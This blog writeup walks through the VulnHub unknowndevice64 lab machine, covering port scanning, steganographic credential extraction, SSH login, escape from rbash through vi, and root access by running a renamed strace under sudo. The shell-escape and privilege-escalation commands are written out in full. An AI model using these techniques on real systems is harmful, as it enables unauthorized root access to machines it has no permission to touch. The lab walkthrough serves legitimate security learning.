---
title:  "VulnHub unknowndevice64 Writeup"
date:   2019-04-18 00:00:00
description: Afternoon Activity on a Day's Off
---

This is a writeup for VulnHub's [unknowndevice64: 1](https://www.vulnhub.com/entry/unknowndevice64-1,293/) challenge. It's been a while since I last did a VulnHub challenge, so it's a pretty good exercise.

### Service Discovery

I started by scanning the host for open ports.

```
$ sudo nmap -sS -Pn 192.168.0.115

Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-18 16:21 WIB
Nmap scan report for 192.168.0.115
Host is up (0.00041s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
31337/tcp open  Elite
MAC Address: 08:00:27:36:D1:DD (Oracle VirtualBox virtual NIC)
```

Port 31337 is serving a static website.

![UnknownDevice64 Landing Page](/assets/images/posts/ud64-homepage.png)

After probing around, it seems that port 1337 is also opened.

```
$ sudo nmap -sS -Pn -p0-3000 192.168.0.115

Starting Nmap 7.01 ( https://nmap.org ) at 2019-04-18 17:13 WIB
Nmap scan report for 192.168.0.115
Host is up (0.00070s latency).
Not shown: 3000 closed ports
PORT     STATE SERVICE
1337/tcp open  waste
MAC Address: 08:00:27:36:D1:DD (Oracle VirtualBox virtual NIC)
```

Using `telnet`, we can see that it's an SSH server listening on port 1337.

```
$ telnet 192.168.0.115 1337
Trying 192.168.0.115...
Connected to 192.168.0.115.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.7

Protocol mismatch.
Connection closed by foreign host.
```

### Web Server

The web service is running using `SimpleHTTPServer` on Python, according to the response header sent by the server.

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.14
Date: Thu, 18 Apr 2019 09:30:40 GMT
Content-type: text/html
Content-Length: 7466
Last-Modified: Mon, 31 Dec 2018 08:56:07 GMT
```

The page contains the following text with the word `h1dd3n` is highlighted with red color.

```
Not a visible enthusiasm but a h1dd3n one, an excitement burning with a cold flame.
```

The following is the full request/response printed by curl when performing the HTTP request.

```
$ curl http://192.168.0.115:31337/ -v;echo
*   Trying 192.168.0.115...
* Connected to 192.168.0.115 (192.168.0.115) port 31337 (#0)
> GET / HTTP/1.1
> Host: 192.168.0.115:31337
> User-Agent: curl/7.47.0
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: SimpleHTTP/0.6 Python/2.7.14
< Date: Thu, 18 Apr 2019 09:35:23 GMT
< Content-type: text/html
< Content-Length: 7466
< Last-Modified: Mon, 31 Dec 2018 08:56:07 GMT
< 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<body>
<title>   Website By Unknowndevice64   </title>  
<head> <meta http-equiv="Content-Type" content="text/html;charset=UTF-8"> <link href="" rel="icon" type="image/png"/> <link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Share+Tech+Mono"> <link type="text/css" rel="stylesheet" href="http://fonts.googleapis.com/css?family=Geo"> 
<meta content="Website By Unknowndevice64 | ud64   name="description"/> 
<meta content="Website By Unknowndevice64 | ud64  name="keywords"/> 
<meta content="Website By Unknowndevice64 | ud64  name="Abstract"/> 
<meta name="Website By Unknowndevice64 | ud64"/>  
</head> 
<style type="text/css" media="all"> html,body{margin:0;padding:0;} #text-shadow-box{position:fixed;left:0;right:0;top:0;bottom:0;width:100%;height:100%;overflow:hidden;background:#ffffff;font-family:Stencil,Arial,sans-serif;-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-user-select:none;} #text-shadow-box #tsb-text,#text-shadow-box #tsb-link{position:absolute;top:49%;left:0;width:100%;height:1em;margin:-0.77em 0 0 0;font-size:70px;line-height:1em;font-weight:bold;text-align:center;} #text-shadow-box #tsb-text{font-size:100px;color:transparent;text-shadow:black 0px -45.2px 19px;} #text-shadow-box #tsb-link a{color:#FFF;text-decoration:none;} #text-shadow-box #tsb-box,#text-shadow-box #tsb-wall{position:absolute;top:50%;left:0;width:100%;height:60%;} #text-shadow-box #tsb-box{-webkit-box-shadow:black 0px -45.2px 39px;-moz-box-shadow:black 0px -45.2px 39px;} #text-shadow-box #tsb-wall{background:#ffffff;} #text-shadow-box #tsb-wall p{position:relative;font-size:15px;line-height:1.5em;text-align:justify;color:#222;width:550px;margin:1.5em auto;cursor:default;} #text-shadow-box #tsb-wall p a{color:#fff;} #text-shadow-box #tsb-wall p a:hover{text-decoration:none;color:#000;background:#fff;} #tsb-spot{position:absolute;top:-50%;left:-50%;width:200%;height:200%;pointer-events:none;background:-webkit-gradient(radial,center center,0,center center,450,from(rgba(0,0,0,0)),to(rgba(0,0,0,1)));background:-moz-radial-gradient(center 45deg,circle closest-side,transparent 0,black 450px);} #blue{color:#0062ff;} </style> <!--    [if IE]> 

<style type="text/css"> /* Sadly no IE9 support for pointer-events: none; nor CSS2 text-shadow */ #tsb-spot {     display: none; } #tsb-ie {     position: absolute;     top: -90%;     left: -50%;     width: 200%;     height: 334%;     background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgY3g9IjUwJSIgY3k9IjUwJSIgcj0iNzUlIj4KICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiMwMDAwMDAiIHN0b3Atb3BhY2l0eT0iMCIvPgogICAgPHN0b3Agb2Zmc2V0PSI3NCUiIHN0b3AtY29sb3I9IiMwMDAwMDAiIHN0b3Atb3BhY2l0eT0iMSIvPgogICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjMDAwMDAwIiBzdG9wLW9wYWNpdHk9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyZWN0IHg9Ii01MCIgeT0iLTUwIiB3aWR0aD0iMTAxIiBoZWlnaHQ9IjEwMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+); } </style> 
<![endif]    --> </center>  <div id="text-shadow-box">      <div style="box-shadow: 0px 75.2px 57px black;" id="tsb-box">         </div></center>       <p style="text-shadow: -112.8px 75.2px 37px black;" id="tsb-text">ud64</p>       <p id="tsb-link">      
<a href="#" target="_blank">ud64</a>    </p>       <div id="tsb-wall">           <div id="tsb-ie">             </div>           <p>             </p>           <center> <img src="ud64.gif" width="200" height="200"> <h4>“Not a visible enthusiasm but a <span style="color:red">h1dd3n</span> one, an excitement burning with a cold flame.” </h4> <h2></h2> <h2>Thanks to: ./AjayVerma (AKA unknowndevice64)</h2> <h5>2018</h5>  </center>
<div id="ttecleado" ?="">                                  <table>                       <tbody>                           <tr>                               <td colspan="2">                                                                    </td>                               <td colspan="2">                                 </td>                             </tr>                           <tr>                             </tr>                         </tbody>                     </table>                 </center>             </div><br />    </div><span style="color: rgb(0, 98, 255); font-family: Tahoma; font-size: 18px;"><strong></strong></span>    <div style="background-position: 282px -284px;" id="tsb-spot">         </div><span style="color: rgb(0, 98, 255); font-family: Tahoma; font-size: 18px;"><strong></strong></span> </div>   <script type="text/javascript" language="javascript" charset="utf-8"> /**  *   *   * just happy (^_^)  *  * Power . . . of Shadows . . .  */ var text = null; var spot = null; var box = null; var boxProperty = ''; init(); function init() {     text = document.getElementById('tsb-text');     spot = document.getElementById('tsb-spot');     box = document.getElementById('tsb-box');     if (typeof box.style.webkitBoxShadow == 'string') {         boxProperty = 'webkitBoxShadow';     } else if (typeof box.style.MozBoxShadow == 'string') {         boxProperty = 'MozBoxShadow';     } else if (typeof box.style.boxShadow == 'string') {         boxProperty = 'boxShadow';     }     if (text && spot && box) {         document.getElementById('text-shadow-box').onmousemove = onMouseMove;         document.getElementById('text-shadow-box').ontouchmove = function (e) {e.preventDefault(); e.stopPropagation(); onMouseMove({clientX: e.touches[0].clientX, clientY: e.touches[0].clientY});};     } } function onMouseMove(e) {     if (typeof e === 'undefined' || typeof e.clientX === 'undefined') {         return;     }     var xm = (e.clientX - Math.floor(window.innerWidth / 2)) * 0.4;     var ym = (e.clientY - Math.floor(window.innerHeight / 3)) * 0.4;     var d = Math.round(Math.sqrt(xm*xm + ym*ym) / 5);     text.style.textShadow = -xm + 'px ' + -ym + 'px ' + (d + 10) + 'px black';     if (boxProperty) {         box.style[boxProperty] = '0 ' + -ym + 'px ' + (d + 30) + 'px black';     }     xm = e.clientX - Math.floor(window.innerWidth / 2);     ym = e.clientY - Math.floor(window.innerHeight / 2);     spot.style.backgroundPosition = xm + 'px ' + ym + 'px'; } </script> /*   <p>     </p> <center>   <div align="center">  #outerCircleText { /* Optional - DO NOT SET FONT-SIZE HERE, SET IT IN THE SCRIPT */ font-style: Electrofied; font-weight: bold; font-family: 'Electrofied', Electrofied, Electrofied; color: white; /* End Optional */  /* Start Required - Do Not Edit */ position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;} #outerCircleText div {position: relative;} #outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;} /* End Required */ /* End Circle Text Styles */ </style>   </center> </body></span><br />
          <br />
          <p class="para" align="left"><p>Website By Unknowndevice64</p>
<!-- key_is_h1dd3n.jpg -->
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>./Ajay Verma &nbsp;</p></p>
                
        </div>

            
            </div>
            
</head>

</body>

</html>
* Closing connection 0
```

When reading the HTML source code, we can find this line of HTML comment near the end of the HTML response.

```
<!-- key_is_h1dd3n.jpg -->
```

### Finding the Hidden Key

The `key_is_h1dd3n.jpg` string on the HTML comment seems to be referring to a file accessible through the web server, as we can also find `ud64.gif` on `http://192.168.0.115:31337/ud64.gif` there. So I tried accessing `http://192.168.0.115:31337/key_is_h1dd3n.jpg` and found this image.

![The Key is Hidden Somewhere](/assets/images/posts/ud64-hidden-secrets.jpg)

This image contains the text `HIDDEN SECRETS`. This image might have something useful hidden in it. I first checked if there's anything on the metadata using `exiftool`, but found nothing useful.

`strings` returned something that looks like a credential.

```
$ strings key_is_h1dd3n.jpg | head -n 5
JFIF
$4.763.22:ASF:=N>22HbINVX]^]8EfmeZlS[]Y
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
W;Et
```

This is what I meant.

```
456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
```

I tried connecting to the SSH server using that as the username and password, but failed. So I tried checking if the secret is hidden using steganography instead.

```
$ steghide extract -sf key_is_h1dd3n.jpg
```

`steghide` asked the passphrase, fir which I entered the word `h1dden` as the image's filename seems to be hinting that the password is `h1dd3n`.

`steghide` gave me a file output named `h1dd3n.txt`, whose content seems like a Brainfuck code to me.

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.
```

Okay, I'm a software engineer. But I don't code in Brainfuck and neither have I ever learned it. I looked for an online Brainfuck code runner to see what the code will do. I used two of them, just to be safe: [El Brainfuck](https://copy.sh/brainfuck/) and [TutorialsPoint's Online Brainfuck Compiler](https://www.tutorialspoint.com/execute_brainfk_online.php). Both returned the same output.

```
ud64:1M!#64@ud
```

It also seems like a username-password pair, so I tried logging into the SSH server using this. I got in.

### Breaking Out of the Restricted Shell

After getting SSH access, there's another thing that we have to overcome: the `rbash` restricted shell.

```
$ ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
```

I can't use `ls` and many other shell commands, so I started to use `echo` to list the directory files instead.

```
$ echo *
Desktop Documents Downloads Music Pictures Public Videos prog web
```

All of the directories are empty except `prog` and `web`. The `PATH` environment variable only points to the `prog` directory, and the environment variable is set to read only so I can't modify it to give myself access to system commands.

```
$ echo $PATH
/home/ud64/prog
```

I can't run system commands using their absolute paths since `rbash` blocks any command execution with `/` character on the executable file reference for security purposes.

The `prog` directory contains the following binaries.

```
$ echo prog/*
prog/date prog/id prog/vi prog/whoami
```

While the `web` directory contains the web server code and assets.

```
$ echo web/*
web/index.html web/key_is_h1dd3n.jpg web/server.py web/ud64.gif
```

We can use `vi` to break out of the `rbash` restriction by spawning `bash` in the `vi` process.

```
:!/bin/bash
```

### Privilege Escalation

Now the restrictions of `rbash` have been taken care of, we can run system commands. I modified the `PATH` environment variable first to allow me to run the system commands without explicitly referencing their absolute paths.

```
$ PATH=$PATH:/bin/:/sbin/:/usr/bin/
```

User `ud64` doesn't have access to `/root/` directory for capturing the flag, so we need to find a way to escalate our privilege first. We can use `sudo` now, but with a pretty limited access.

```
$ sudo -l
User ud64 may run the following commands on unknowndevice64_v1:
    (ALL) NOPASSWD: /usr/bin/sysud64
```

We can run the `sysud64` command as `root` from `ud64` user using `sudo`. I checked how to use the `sysud64` and what it's supposed to do. This is what the help menu shows.

```
$ sysud64 -h
usage: strace [-CdffhiqrtttTvVwxxy] [-I n] [-e expr]...
              [-a column] [-o file] [-s strsize] [-P path]...
              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]
   or: strace -c[dfw] [-I n] [-e expr]... [-O overhead] [-S sortby]
              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]

Output format:
  -a column      alignment COLUMN for printing syscall results (default 40)
  -i             print instruction pointer at time of syscall
  -k             obtain stack trace between each syscall (experimental)
  -o file        send trace output to FILE instead of stderr
  -q             suppress messages about attaching, detaching, etc.
  -r             print relative timestamp
  -s strsize     limit length of print strings to STRSIZE chars (default 32)
  -t             print absolute timestamp
  -tt            print absolute timestamp with usecs
  -T             print time spent in each syscall
  -x             print non-ascii strings in hex
  -xx            print all strings in hex
  -y             print paths associated with file descriptor arguments
  -yy            print protocol specific information associated with socket file descriptors

Statistics:
  -c             count time, calls, and errors for each syscall and report summary
  -C             like -c but also print regular output
  -O overhead    set overhead for tracing syscalls to OVERHEAD usecs
  -S sortby      sort syscall counts by: time, calls, name, nothing (default time)
  -w             summarise syscall latency (default is system time)

Filtering:
  -e expr        a qualifying expression: option=[!]all or option=[!]val1[,val2]...
     options:    trace, abbrev, verbose, raw, signal, read, write, fault
  -P path        trace accesses to path

Tracing:
  -b execve      detach on execve syscall
  -D             run tracer process as a detached grandchild, not as parent
  -f             follow forks
  -ff            follow forks with output into separate files
  -I interruptible
     1:          no signals are blocked
     2:          fatal signals are blocked while decoding syscall (default)
     3:          fatal signals are always blocked (default if '-o FILE PROG')
     4:          fatal signals and SIGTSTP (^Z) are always blocked
                 (useful to make 'strace -o FILE PROG' not stop on ^Z)

Startup:
  -E var         remove var from the environment for command
  -E var=val     put var=val in the environment for command
  -p pid         trace process with process id PID, may be repeated
  -u username    run command as username handling setuid and/or setgid

Miscellaneous:
  -d             enable debug output to stderr
  -v             verbose mode: print unabbreviated argv, stat, termios, etc. args
  -h             print help message
  -V             print version
```

`sysud64` seems to be `strace` renamed. `strace` is an utility tool to debug other programs, so we should be able to spawn a `bash` shell as `root` if we run `sysud64` using `sudo` as `ud64` user.

```
$ sudo sysud64 -o /dev/null bash
```

We got the root shell now.

### Capturing the Flag

Since we already have the root access, we only need to read the flag file.

```
# cat /root/flag.txt
```

Here's our flag!

```
 / _ \  | |              | |                                 
/ /_\ \ | |__   __ _  ___| | _____ _ __                      
|  _  | | '_ \ / _` |/ __| |/ / _ \ '__|                     
| | | | | | | | (_| | (__|   <  __/ |                        
\_| |_/ |_| |_|\__,_|\___|_|\_\___|_|                        
                                                             
                                                             
     _                    __             _                   
    | |                  / _|           | |                  
  __| | ___   ___  ___  | |_ ___  _ __  | | _____   _____    
 / _` |/ _ \ / _ \/ __| |  _/ _ \| '__| | |/ _ \ \ / / _ \   
| (_| | (_) |  __/\__ \ | || (_) | |    | | (_) \ V /  __/   
 \__,_|\___/ \___||___/ |_| \___/|_|    |_|\___/ \_/ \___|   
                                                             
                                                             
          _           _           _   _                      
         | |         | |         | | | |                     
__      _| |__   __ _| |_    ___ | |_| |__   ___ _ __ ___    
\ \ /\ / / '_ \ / _` | __|  / _ \| __| '_ \ / _ \ '__/ __|   
 \ V  V /| | | | (_| | |_  | (_) | |_| | | |  __/ |  \__ \   
  \_/\_/ |_| |_|\__,_|\__|  \___/ \__|_| |_|\___|_|  |___/   
                                                             
                                                             
                     _     _               _         _       
                    | |   | |             | |       | |      
__      _____  _   _| | __| |  _ __   ___ | |_    __| | ___  
\ \ /\ / / _ \| | | | |/ _` | | '_ \ / _ \| __|  / _` |/ _ \ 
 \ V  V / (_) | |_| | | (_| | | | | | (_) | |_  | (_| | (_) |
  \_/\_/ \___/ \__,_|_|\__,_| |_| |_|\___/ \__|  \__,_|\___/ 
                                                             
                                                             
  __                                                         
 / _|                                                        
| |_ ___  _ __   _ __ ___   ___  _ __   ___ _   _            
|  _/ _ \| '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |           
| || (_) | |    | | | | | | (_) | | | |  __/ |_| |_          
|_| \___/|_|    |_| |_| |_|\___/|_| |_|\___|\__, (_)         
                                             __/ |           
                                            |___/            



   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( . | / | u | n | k | n | o | w | n | d | e | v | i | c | e | 6 | 4 )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 


```

So that's all. Many thanks to [Ajay Verma](https://www.vulnhub.com/author/ajay-verma,598/) for this challenge!